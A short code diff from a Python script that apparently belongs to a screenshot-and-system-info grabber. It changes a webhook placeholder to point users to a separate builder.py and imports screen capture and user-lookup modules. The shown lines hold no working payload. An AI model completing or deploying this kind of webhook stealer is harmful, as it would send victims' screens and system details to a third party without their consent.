@@ -13,7 +13,7 @@ import random, subprocess, platform, socket
 import time, os
 import getpass
 
-whook = "put ur webhook here or it wont work"
+whook = "run builder.py first :skull:"
 
 try:
     from PIL import ImageGrab
